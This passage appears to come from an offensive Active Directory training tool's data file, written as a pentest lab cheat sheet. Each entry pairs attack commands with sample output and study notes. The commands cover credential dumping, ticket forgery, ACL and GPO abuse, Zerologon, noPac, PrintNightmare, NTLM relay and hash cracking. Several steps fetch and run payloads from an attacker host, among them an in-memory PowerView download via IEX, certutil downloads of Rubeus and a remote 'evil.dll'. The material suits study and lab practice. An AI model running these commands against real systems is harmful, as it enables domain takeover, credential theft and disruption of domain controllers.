      why: "NetExec (nxc) is the one tool that does most of AD: enumeration, validation, spidering, roasting, dumping, and execution, all under a single authentication syntax. Reach for it constantly, it is the workhorse you return to at every stage. The payoff of learning its flag families once is large: you stop context-switching between a dozen impacket scripts and drive most of the engagement from one consistent command line.",
      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --users --pass-pol", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!',
        'SMB  10.10.10.10  445  DC01  [*] Minimum password length: 7',
        'SMB  10.10.10.10  445  DC01  Share       Permissions',
        'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, and the password policy in a single run, then can execute modules. A WRITE share is a place to drop a payload or capture a hash.',
    },
    'kerberos-tickets': {
      why: "Most \"impacket is broken\" moments are actually Kerberos hygiene: clock skew over five minutes breaks everything, tools read tickets from KRB5CCNAME, and you often need kinit or getTGT first. Reach for this knowledge whenever Kerberos auth mysteriously fails. It is not an attack, it is the operational discipline that makes every Kerberos attack work, syncing your clock to the DC and pointing tools at the right ccache fixes most of the frustrating failures.",
      cmd: 'sudo ntpdate -u 10.10.10.10', tool: 'ntpdate',
      output: [
        '# before: nxc ldap ... -> KRB_AP_ERR_SKEW (clock skew too great)',
        '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
      ].join('\n'),
      signal: '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
      teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes, "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC with ntpdate and retry.',
    },
    'bloodyad-acl': {
      why: "In modern AD the privilege paths are ACL paths, and bloodyAD edits the directory directly to abuse them: GenericAll, WriteDacl, WriteOwner, or group-write rights become \"add myself to this group\" or \"grant myself DCSync\". Reach for it when BloodHound or manual enumeration finds a writable object you control. It runs from Linux with just a credential, so it is the clean remote way to turn an ACL finding into actual privilege.",
      cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup NewP@ss123!", tool: 'bloodyAD',
      output: [
        '[+] Password changed successfully for svc_backup',
      ].join('\n'),
      signal: '[+] Password changed successfully for svc_backup',
      teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password", a concrete takeover. Each edge BloodHound draws is an action like this one.',
    },
    'gmsa-read': {
      why: "Group Managed Service Accounts have long random passwords AD rotates for you, but PrincipalsAllowedToRetrieveManagedPassword says WHO can read the current blob, and if you are (or can become) on that list you recover the NT hash directly, no cracking. Reach for it when enumeration shows a gMSA you are allowed to read. gMSAs are often over-privileged service accounts, so reading one can be a real jump, and the hash is immediately passable.",
      cmd: "bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object 'svc_app$' --attr msDS-ManagedPassword", tool: 'bloodyAD',
      output: [
        'distinguishedName: CN=svc_app,CN=Managed Service Accounts,DC=acme,DC=internal',
        'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
      ].join('\n'),
      signal: 'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
      teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly (no cracking) and can pass it. gMSAs are often over-privileged service identities.',
    },
    'laps-read': {
      why: "LAPS stores each machine's local-admin password in a computer attribute, and read rights are delegated, frequently to helpdesk or workstation-admin groups that are easier to compromise than you would expect. Reach for it when you control a principal with LAPS read rights over a machine. It hands you that host's local Administrator password in cleartext, a clean lateral-movement or privesc step without touching LSASS or cracking anything.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M laps", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] LAPS passwords readable by jbloggs',
        'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
      ].join('\n'),
      signal: 'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
      teach: 'LAPS randomises the local Administrator password per machine, good security, unless your account can read the ms-Mcs-AdmPwd attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
    },
    'ticket-reuse': {
      why: "Stolen or forged Kerberos tickets (.kirbi or ccache) work without any password, you simply ARE that principal until the ticket expires. On Windows, Rubeus injects them into your session; on Linux, you point KRB5CCNAME at the ccache. Reach for it after you dump tickets from LSASS or forge one. It is how you reuse a captured identity: pass-the-ticket for a stolen TGS, overpass-the-hash to turn an NT hash into a TGT, all without knowing the password.",
      cmd: 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal', tool: 'impacket-psexec',
      output: [
        '[*] Requesting shares on dc01.acme.internal.....',
        '[*] Found writable share ADMIN$',
        '[!] Launching semi-interactive shell',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'Pass-the-Ticket loads a stolen or forged Kerberos ticket (a .ccache) into your session via KRB5CCNAME, no password needed. Every tool that speaks Kerberos then acts as that user; here psexec lands a SYSTEM shell.',
    },
    'powerview-enum': {
      why: "Once you are ON a domain-joined Windows box, PowerView gives deep AD recon from the inside with no extra privileges: users, groups, SPN accounts, ACLs, trusts, all queried live. Reach for it when you have an interactive Windows foothold and want to explore without uploading heavy tooling. Loaded in memory it touches no disk, which makes it the go-to inside-the-domain recon tool, when AMSI has not signatured it.",
      signal: 'ActiveDirectoryRights  : GenericAll',
      teach: 'PowerView is a PowerShell script, not a built-in, so you load it into memory straight from your box with IEX (nothing touches disk), then call its functions. A GenericAll ACL over a group is a takeover edge (you can add yourself to it). Same data BloodHound uses, gathered by hand.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding PowerView.ps1', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'powershell', cmd: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1'); Find-InterestingDomainAcl -ResolveGUIDs", output: [
          'IdentityReferenceName  : jbloggs',
          'ActiveDirectoryRights  : GenericAll',
          'ObjectDN               : CN=Helpdesk Admins,OU=Groups,DC=acme,DC=internal',
        ].join('\n') },
      ],
    },
    'ad-legacy-enum': {
      why: "net.exe, setspn, and nltest ship with Windows, so they trigger no AMSI, no signatures, and need no uploads, yet they answer most first-pass AD questions: users, groups, membership, SPNs, DCs, password policy. Reach for them on a locked-down box where PowerView and uploads are blocked. They are the living-off-the-land option, less powerful than PowerView but always present, which makes them the reliable fallback when everything fancier is caught.",
      cmd: 'net group "Domain Admins" /domain', tool: 'net',
      output: [
        'Group name     Domain Admins',
        'Members',
        '-------------------------------------------------------------------------------',
        'Administrator            backupadmin',
      ].join('\n'),
      signal: 'Administrator            backupadmin',
      teach: 'Every Windows box ships with net and nltest. They are noisy but always present, when you land with no tools, these built-ins still list users, groups, and Domain Admins. backupadmin in Domain Admins is a target worth pursuing.',
    },
    'ad-psdotnet-enum': {
      why: "When PowerView is signatured or missing, bare .NET classes do the same recon with no imports: System.DirectoryServices locates the PDC and resolves the domain, DirectorySearcher queries the directory. Reach for it when AMSI eats PowerView but you still have PowerShell. It is the stealthy middle ground, more capable than net.exe, less detectable than PowerView, and because it uses built-in framework classes there is nothing to flag.",
      cmd: 'powershell -ep bypass -c "([ADSISearcher]\'(servicePrincipalName=*)\').FindAll()"', tool: 'powershell',
      output: [
        'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
        'Properties: samaccountname={svc_sql} serviceprincipalname={MSSQLSvc/db01}',
      ].join('\n'),
      signal: 'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
      teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell, no upload. An account with an SPN (svc_sql) is kerberoastable. Living off the land this way sidesteps AV that flags known tooling.',
    },
    'ad-acl-abuse': {
      why: "AD objects carry ACLs, and misconfigured ones hand out privilege for free: GenericAll on a group means add yourself, ForceChangePassword on a user means reset their password, WriteDacl means grant yourself DCSync. Reach for it when BloodHound or manual enumeration finds an ACL you control over a useful object. These are the backbone of modern AD escalation, no exploit, no CVE, just abusing permissions the admins set wrong.",
      cmd: 'net group "Helpdesk Admins" jbloggs /add /domain', tool: 'net',
      output: [
        'The command completed successfully.',
      ].join('\n'),
      signal: 'The command completed successfully.',
      teach: 'When you hold GenericAll (or AddMember) over a group, you simply add yourself to it, the ACL edge becomes membership, and membership becomes its privileges. Walk the BloodHound path one edge at a time until it reaches Domain Admin or DCSync.',
    },
    'zerologon-exploit': {
      why: "The Zerologon exploit fully compromises a vulnerable DC with no credentials: reset the machine-account password to empty, then replicate the whole domain. But resetting that password can break the DC's domain membership, so you MUST restore it afterward or risk taking the DC offline. Reach for it only after the safe check confirms vulnerability, and only when you are prepared to restore, this is the destructive one, handled carefully.",
      cmd: 'python3 set_empty_pw.py DC01 10.10.10.10', tool: 'sh',
      output: [
        '[*] Resetting DC01$ machine account password to empty',
        '[+] Success! You can now DCSync with -no-pass',
        '[!] Remember to restore the original password afterward',
      ].join('\n'),
      signal: '[+] Success! You can now DCSync with -no-pass',
      teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain. It also breaks the DC until you restore the original password from the local SAM, so the restore step is mandatory. Lab-only, high-risk.',
    },
    'coerce-auth': {
      why: "You can force a DC or server to authenticate to a host you control over PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), or DFSCoerce (MS-DFSNM), and that coerced machine authentication is the trigger for a relay (to ADCS or LDAP) or an unconstrained-delegation TGT capture. Reach for it when you need the DC's own authentication and have something set up to catch it. Coercion is the spark: useless alone, powerful paired with a relay or delegation host waiting to receive the auth.",
      cmd: "coercer coerce -t 10.10.10.10 -l 10.10.14.5 -u jbloggs -p 'Autumn2026!' -d acme.internal", tool: 'coercer',
      output: [
        '[+] (PetitPotam) EfsRpcOpenFileRaw triggered',
        '[+] Target 10.10.10.10 authenticated to 10.10.14.5',
        '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
      ].join('\n'),
      signal: '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
      teach: 'Coercion tricks a target (often a DC) into authenticating to you (PetitPotam, PrinterBug). The machine-account hash you catch (DC01$) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
    },
    'unconstrained-delegation': {
      why: "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it, so if you own such a host and coerce the DC to connect, you capture the DC's own TGT, which is effectively the domain. Reach for it when enumeration flags an unconstrained-delegation host you can compromise. It is a two-part play, own the delegation host, then coerce a high-value target to it, and the reward is a DC-level ticket.",
      signal: '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Rubeus is an .exe, so stage it first (serve from your box, pull it over with certutil), then run its monitor. Pair it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe monitor /interval:5 /filteruser:DC01$ /nowrap', output: [
          'CertUtil: -URLCache command completed successfully.',
          '[*] Monitoring every 5 seconds for new TGTs',
          '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
          '[*] Base64EncodedTicket: doIF...',
        ].join('\n') },
      ],
    },
    'silver-ticket': {
      why: "A service account's (or computer's) NT hash lets you forge a service ticket for that specific service as any user, with no DC contact and no krbtgt, so it is quieter than a golden ticket and needs no domain dominance. Reach for it when you have a service account's hash and want access to just that service (CIFS, HTTP, MSSQL) as an admin. The tradeoff is scope: a silver ticket is one service, but it is stealthy and needs far less than a golden one.",
      cmd: 'impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain acme.internal -spn cifs/file01 administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating basic skeleton ticket and PAC Infos',
        '[*] Customizing ticket for CIFS/file01.acme.internal',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'A silver ticket forges a service ticket using one service account\'s hash, scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
    },
    'diamond-ticket': {
      why: "A diamond ticket modifies a real, DC-issued TGT instead of forging one from scratch (a golden ticket), so its fields stay consistent with legitimate tickets and it evades the detections that catch forged ones. It still needs the krbtgt hash. Reach for it when you own the domain but want stealth over a plain golden ticket. It is the evasion-conscious version of the same idea: start from a genuine ticket, change what you need, and blend in.",
      signal: '[+] Saving diamond ticket to administrator.ccache',
      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. It is a Rubeus .exe, so stage it first (serve from your box, certutil it onto the target), then run the diamond command. Both ticket types need the krbtgt key, this is a stealthier flavour of the same post-DA persistence.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe diamond /krbkey:<aes256> /user:jbloggs /password:Autumn2026! /ticketuser:administrator /domain:acme.internal', output: [
          'CertUtil: -URLCache command completed successfully.',
          '[*] Requesting a legitimate TGT for jbloggs',
          '[*] Decrypting with the krbtgt key and modifying the PAC -> administrator',
          '[+] Saving diamond ticket to administrator.ccache',
        ].join('\n') },
      ],
    },
    'gpo-abuse': {
      why: "Write access to a GPO, or to an OU it is linked to, is code execution as SYSTEM on every computer in scope: you add an immediate scheduled task or a local-admin membership through the policy and it applies fleet-wide. Reach for it when an ACL finding gives you write over a GPO. It is one of the highest-impact ACL abuses, a single writable policy can mean SYSTEM on dozens of machines, so GPO write rights are a prize worth hunting in BloodHound.",
      cmd: "pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id <GUID> -command \"net localgroup administrators jbloggs /add\"", tool: 'pygpoabuse',
      output: [
        '[+] Version updated for GPO {31B2F340-...}',
        '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
      ].join('\n'),
      signal: '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
      teach: 'Write access to a Group Policy Object lets you push a scheduled task to every computer the GPO is linked to, code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
    },
    'dnsadmins-abuse': {
      why: "A member of DnsAdmins can point the DNS service (running as SYSTEM on the DC) at an arbitrary DLL through a registry value, and restarting the service loads your DLL as SYSTEM on the DC. Reach for it when you land in the DnsAdmins group, which is sometimes handed out as a \"low-risk\" admin role. It is a classic DC privesc from a seemingly minor membership, and it is why DnsAdmins is effectively a path to Domain Admin.",
      cmd: 'nxc smb 10.10.10.10 -u svc_dns -p P@ss -x "reg add ...\\DNS\\Parameters /v ServerLevelPluginDll /d \\\\10.10.14.5\\share\\dns.dll"', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] Executed command',
        'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
        '# after: sc.exe stop dns & sc.exe start dns -> DLL runs as SYSTEM',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
      teach: 'The DnsAdmins group can tell the DNS service (often on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy, but membership in DnsAdmins is a direct line to owning the DC.',
    },
    'sid-history-abuse': {
      why: "SID history lets a principal carry privileges from another domain, and with the krbtgt key you can inject a privileged SID (like Enterprise Admins) into a forged ticket to grant yourself those rights, including across a forest trust. Reach for it when you hold krbtgt and want to escalate across domains or persist with hidden privilege. It is advanced and post-domain-dominance, the extra SID rides along invisibly, granting access that does not show up in normal group memberships.",
      cmd: 'impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain acme.internal -extra-sid S-1-5-21-ROOT-519 administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating golden ticket with extra SID (Enterprise Admins)',
        '[+] Saving ticket in administrator.ccache',
        '[*] Cross-domain access via SID History granted',
      ].join('\n'),
      signal: '[*] Cross-domain access via SID History granted',
      teach: 'SID History lets a principal carry privileged SIDs from another domain, legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
    },
    'eternalblue': {
      why: "MS17-010 (EternalBlue) is unauthenticated SYSTEM-level RCE against an unpatched SMBv1 server, no credentials needed, which is why nmap's smb-vuln-ms17-010 flag is worth checking on any old Windows box. Reach for it when that check says VULNERABLE. It is reliable but can blue-screen the target, so treat it as a known-good exploit against confirmed-vulnerable hosts, not a blind spray, and remember it is a patch gap, not a misconfiguration.",
      cmd: 'nmap -p445 --script smb-vuln-ms17-010 -oN scans/ms17010.txt 10.10.10.10', tool: 'nmap',
      output: [
        'Host script results:',
        '| smb-vuln-ms17-010:',
        '|   VULNERABLE: Remote Code Execution in SMBv1 (ms17-010)',
        '|_    State: VULNERABLE',
      ].join('\n'),
      signal: '|_    State: VULNERABLE',
      teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot, but confirm the target is a real lab host, not a honeypot, before you fire the exploit.',
    },
    'nopac': {
      why: "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and then request a ticket as a privileged account, a straight line from a low-priv domain credential to Domain Admin. Reach for it when you have any domain credential and the DC is unpatched (CVE-2021-42278/42287). It is one of the fastest post-foothold escalations when it applies, so checking the DC's patch level early can save you the whole ACL-path grind.",
      cmd: "noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -dump", tool: 'noPac.py',
      output: [
        '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
        '[+] Got a TGT impersonating a Domain Admin',
        '[*] Dumping NTDS...',
        'krbtgt:502:aad3b...:1a59bd44...:::',
      ].join('\n'),
      signal: '[+] Got a TGT impersonating a Domain Admin',
      teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user, a near-instant domain takeover on unpatched DCs. Beyond core OSCP scope but common in labs; confirm the DC is unpatched first.',
    },
    'printnightmare': {
      why: "The Print Spooler can be abused to load your DLL as SYSTEM, remotely against any host running Spooler with a domain credential, or locally for privesc. Reach for it when Spooler is running and you have a credential, or need a local escalation. It is reliable when the service is up (and it is up by default on a lot of hosts), which is exactly why disabling Spooler became standard hardening advice after it dropped.",
      cmd: "CVE-2021-1675.py acme.internal/jbloggs:'Autumn2026!'@10.10.10.10 '\\\\10.10.14.5\\share\\evil.dll'", tool: 'CVE-2021-1675.py',
      output: [
        '[*] Connecting to the Print Spooler service (MS-RPRN)',
        '[*] Triggering AddPrinterDriverEx to load the remote driver',
        '[+] Driver loaded; payload executed as SYSTEM',
      ].join('\n'),
      signal: '[+] Driver loaded; payload executed as SYSTEM',
      teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to load a driver as SYSTEM, local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
    },
    'ms14-068': {
      why: "On a DC missing the MS14-068 patch, an ordinary domain user can forge a Kerberos PAC claiming Domain Admin membership, turning low-priv credentials straight into domain compromise. Reach for it only on genuinely old DCs, it is an ancient bug. It is rare now but trivial when present: a single command takes a basic user to DA, so on a legacy box it is worth a quick check before anything harder.",
      cmd: "impacket-goldenPac -dc-ip 10.10.10.10 acme.internal/jbloggs:'Autumn2026!'@dc01.acme.internal", tool: 'impacket-goldenPac',
      output: [
        '[*] Requesting a TGT with a forged PAC (admin SID)',
        '[+] Authenticated as Domain Admin',
        'C:\\Windows\\system32>',
      ].join('\n'),
      signal: '[+] Authenticated as Domain Admin',
      teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin membership. It only works on DCs missing the 2014 patch, rare today, but a clean, memorable example of how PAC validation can fail.',
    },
    'delegation-abuse': {
      why: "Kerberos delegation lets services act on behalf of users, and its misconfigurations are escalation paths: unconstrained delegation caches TGTs (coerce the DC to it and you own the domain), while constrained and resource-based variants let a service request tickets as anyone. Reach for it when enumeration flags a delegation setting you can abuse. It is a family of related attacks, the common thread is that delegation trust, set too loosely, lets you borrow a more privileged identity.",
      cmd: 'impacket-addcomputer acme.internal/jbloggs:Autumn2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!', tool: 'impacket-addcomputer',
      output: [
        '[*] Successfully added machine account OBOL$ with password MachinePass123!',
        '[*] MachineAccountQuota (default 10) allowed the creation',
      ].join('\n'),
      signal: '[*] Successfully added machine account OBOL$ with password MachinePass123!',
      teach: 'By default any domain user can add up to 10 computer accounts (MachineAccountQuota). A machine account you control is the starting piece for RBCD and S4U delegation attacks, create it, then configure delegation to impersonate an admin.',
    },
    'getst-impersonation': {
      why: "Constrained and resource-based constrained delegation let a service account request service tickets as ANY user (Administrator included) through the S4U2self and S4U2proxy extensions, and getST performs that exchange for you. Reach for it when you control an account with delegation rights, or you set up RBCD through an ACL write. It is the practical cash-in of a delegation finding: the output is a ticket that lets you act as Administrator against the delegated service.",
      cmd: "impacket-getST -spn cifs/file01.acme.internal -impersonate administrator 'acme.internal/OBOL$:MachinePass123!'", tool: 'impacket-getST',
      output: [
        '[*] Impersonating administrator',
        '[*] Requesting S4U2self',
        '[*] Requesting S4U2proxy',
        '[+] Saving ticket in administrator@cifs_file01.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator@cifs_file01.ccache',
      teach: 'With delegation rights you ask the KDC for a service ticket "on behalf of" any user (S4U2self then S4U2proxy) and get a ccache that lets you act as Administrator against that service. Load the ticket (KRB5CCNAME) and you are in.',
    },

    // ============================ CREDENTIALS & CRACKING ============================
    'responder-poison': {
      why: "On a Windows network, when a host cannot resolve a name the normal way it shouts for it over LLMNR, NBT-NS, and mDNS, and Responder answers those shouts, so a user mistyping a share name hands you their NetNTLMv2 hash to crack. It runs entirely on your box and is passive, you catch authentication that comes to you, you send none. Reach for it with a foothold on the segment and no creds yet; it is often the first domain credential you get.",
      signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
      teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is PASSIVE: it only catches authentication that happens to come your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
      steps: [
        { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', output: [
          '[+] Poisoners: LLMNR, NBT-NS, MDNS',
          '[+] Servers: SMB, HTTP, LDAP on',
          '[+] Listening for events...',
        ].join('\n') },
        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
          '[+] DFSCoerce: 10.10.10.50 coerced to authenticate to 10.10.14.5',
          '↩ caught in your Responder window:',
          '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
          '[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:A1B2...:0101...',
        ].join('\n') },
      ],
    },
    'ntlm-relay-attack': {
      why: "When SMB signing is not required you do not have to crack captured authentication, you can relay it live to another host and act as that user: dump its SAM, run a command, add a computer. Pair it with coercion or Responder to generate the auth. Reach for it when the NTLM Relay finding says signing is off. It beats cracking because you never need the password at all, so it works even against strong ones.",
      signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
      teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it, but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
      steps: [
        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
          '[+] 10.10.10.50 coerced to authenticate to 10.10.14.5',
          '↩ relayed by ntlmrelayx:',
          '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
          '[*] Dumping local SAM hashes',
          'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        ].join('\n') },
      ],
    },
    'mitm6-ipv6-takeover': {
      why: "Windows prefers IPv6 and constantly asks for a DHCPv6 lease that usually goes unanswered, so mitm6 answers as a rogue DHCPv6 and DNS server, becomes the victim's DNS, and feeds the resulting authentication into a relay. Reach for it on a dual-stack Windows network when plain Responder is quiet. It is powerful but noisy and disruptive, so understand the blast radius before you run it on anything you care about.",
      signal: '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
      teach: 'mitm6 runs on your box and abuses Windows\' preference for IPv6: it answers the DHCPv6 nobody configured, becomes the victim\'s DNS, and points WPAD at you, then ntlmrelayx relays the auth that follows to LDAP. It is not passive, but it does wait for a Windows host to renew (often a reboot or logon), so pair it with the relay and give it time.',
      steps: [
        { where: 'local', tool: 'mitm6', cmd: 'sudo mitm6 -i eth0 -d acme.internal', output: [
          '[*] Sending rogue DHCPv6 replies; spoofing DNS for *.acme.internal',
          '[*] IPv6 address assigned to victim 10.10.10.50',
        ].join('\n') },
        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.acme.internal -l loot', output: [
          '[*] Victim queried WPAD, serving malicious proxy config',
          '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
          '[*] Domain info and delegation rights written to loot/',
        ].join('\n') },
      ],
    },
    'crack-identify': {
      why: "Spending two seconds to identify a hash format saves an hour of cracking it with the wrong mode. The leading marker ($krb5tgs$, $DCC2$, $6$) or the length and character set tells you the algorithm and the exact hashcat mode number. Do this before every crack. It is the cheapest insurance in the whole workflow, because a wrong mode number means hashcat either errors out or silently never matches.",
      cmd: 'nth -f hashes.txt', tool: 'name-that-hash',
      output: [
        '$krb5tgs$23$...',
        'Most Likely:',
        '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
      ].join('\n'),
      signal: '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm, identify first, always.',
    },
    'crack-kerberoast': {
      why: "Service accounts are the soft target of Active Directory: their passwords are set by humans, rarely rotated, and any domain user can request a crackable ticket for them. A cracked $krb5tgs$ hash hands you that service account's plaintext, which often has elevated rights. Reach for it after roasting, run it offline, and if rockyou does not crack it the account probably has a strong password, so move on rather than grinding.",
      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$...:3f2a...:Summer2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you crack it offline at full speed with no lockout. "Cracked" means you now hold that account\'s cleartext password.',
    },
    'crack-asrep-offline': {
      why: "An account configured without Kerberos pre-authentication lets anyone request a chunk of ciphertext encrypted with that user's password, with no credentials at all, and that $krb5asrep$ hash cracks offline to their plaintext. Reach for it after AS-REP roasting surfaces such a user. It is pure upside: finding even one pre-auth-disabled account can be your entire foothold into the domain.",
      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2...:Welcome2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" turns the roast into a login, a real domain credential.',
    },
    'crack-ntlm': {
      why: "An NTLM hash pulled from the SAM or NTDS may crack to a plaintext that logs in here or, more usefully, is reused on another host. Reach for it after a dump, but remember you do not always need to crack: NTLM can be passed directly. Crack it when you specifically need the cleartext, for a service that will not take a hash (RDP, a web login, SSH), or to prove password reuse.",
      cmd: 'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '31d6cfe0d16ae931b73c59d7e0c089c0:(empty)',
        '7c6a180b36896a0a8c02787eeafb0e4c:password1',
        'Status...........: Cracked',
      ].join('\n'),
      signal: '7c6a180b36896a0a8c02787eeafb0e4c:password1',
      teach: 'A dumped NTLM hash (mode 1000) cracks offline. You do not always need to (NTLM can be passed directly), but a recovered cleartext password is reusable on services that will not take a hash (RDP, web, SSH).',
    },
    'crack-netntlmv2': {
